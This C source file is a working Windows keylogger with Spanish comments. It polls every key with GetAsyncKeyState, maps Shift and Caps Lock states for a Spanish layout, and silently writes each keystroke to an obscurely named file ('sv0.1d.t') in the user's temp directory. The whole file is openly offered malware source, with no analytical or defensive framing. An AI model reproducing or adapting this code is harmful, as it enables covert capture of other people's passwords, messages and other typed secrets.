#include <windows.h>
#include <stdio.h>


int writeChar(FILE *file, char character, unsigned char i){
    fprintf(file, "%c", character);
    fflush(file);
    printf("La tecla %c | %d fue presionada.\n", character, i);
}

void KeyRecorder(FILE *file) {
    unsigned char i;
    while (1) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {    

                // Verificar si el archivo se ha abierto correctamente
                if (file == NULL) {
                    printf("Error al abrir el archivo.\n");
                    return;
                }

                // Convertir la tecla según el estado de Shift y Caps Lock
                char convertedKey = i;

                // Verificar si la tecla Shift está presionada
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    switch (i) {
                        case VK_SHIFT: convertedKey = '\0'; continue;
                        case VK_ESCAPE: convertedKey = '\0'; continue;
                        case VK_SPACE: convertedKey = ' '; break;
                        case VK_BACK: convertedKey = '\0'; break;
                        case VK_CONTROL: convertedKey = '\0'; continue;
                        case VK_RETURN: convertedKey = '\n'; continue;
                        case VK_OEM_PLUS: writeChar(file, '*', i); break;
                        case VK_OEM_MINUS: writeChar(file, '_', i); break;
                        case VK_OEM_1: writeChar(file, '^', i); break;
                        case VK_OEM_PERIOD: writeChar(file, ':', i); break;
                        case VK_OEM_COMMA: writeChar(file, ';', i); break;
                        case '1': writeChar(file, '!', i); break;
                        case '2': writeChar(file, '"', i); break;
                        case '3': fprintf(file, "%s", "·"); break;
                        case '4': writeChar(file, '$', i); break;
                        case '5': writeChar(file, '%', i); break;
                        case '6': writeChar(file, '&', i); break;
                        case '7': writeChar(file, '/', i); break;
                        case '8': writeChar(file, '(', i); break;
                        case '9': writeChar(file, ')', i); break;
                        case '0': writeChar(file, '=', i); break;
                        case 219: writeChar(file, '?', i); break;
                        case 221: fprintf(file, "%s", "¿"); break;
                        case 222: fprintf(file, "%s", "´"); break;
                        case 220: fprintf(file, "%s", "ª"); break; // º
                        default:
                            // Si es una letra, convertirla a mayúscula
                            if (i >= 'A' && i <= 'Z' || i == ' ' ) {
                                writeChar(file, i, i);
                            } else {
                                // De lo contrario, usar el valor por defecto
                                convertedKey = '\0';
                            }
                            break;
                    }
                } else if (GetKeyState(VK_CAPITAL) & 0x0001) {
                    // Bloq Mayús activado, convertir a mayúsculas
                    writeChar(file, toupper(i), i); 
                } else {
                    // Bloq Mayús desactivado, convertir a minúsculas
                    switch (i) {
                        case VK_OEM_PERIOD: writeChar(file, '.', i); break;
                        case VK_OEM_MINUS: writeChar(file, '-', i); break;
                        case VK_OEM_PLUS: writeChar(file, '+', i); break;
                        case VK_OEM_COMMA: writeChar(file, ',', i); break;
                        case 222: fprintf(file, "%s", "´"); printf("Acento registrado...\n"); break; // ´
                        case 186: writeChar(file, '\x60', i); break; // `
                        case 220: fprintf(file, "%s", "º"); break; // º
                        default: 
                            // Si es una letra, convertirla a minuscula, si es un número o espacio, escribirlo.
                            if (i >= 'A' && i <= 'Z' || i == ' ' || i >= '0' && i <= '9') {
                                writeChar(file, tolower(i), i);
                            } else {
                                // De lo contrario, usar el valor por defecto

                                convertedKey = '\0';
                            }
                        
                    }
                    
                }
            }
        }
    }
}

int startKeyRecord(void) {
    char *tempDir = getenv("temp");
    char *file = "sv0.1d.t";
    char direction[200]; snprintf(direction, 200, "%s\\%s", tempDir, file);

    FILE *fp = fopen(direction, "wb");

    // Verificar si el archivo se abre correctamente
    if (fp == NULL) {
        printf("Error al abrir el archivo.\n");
        return 1;
    }

    KeyRecorder(fp);

    return 0;
}
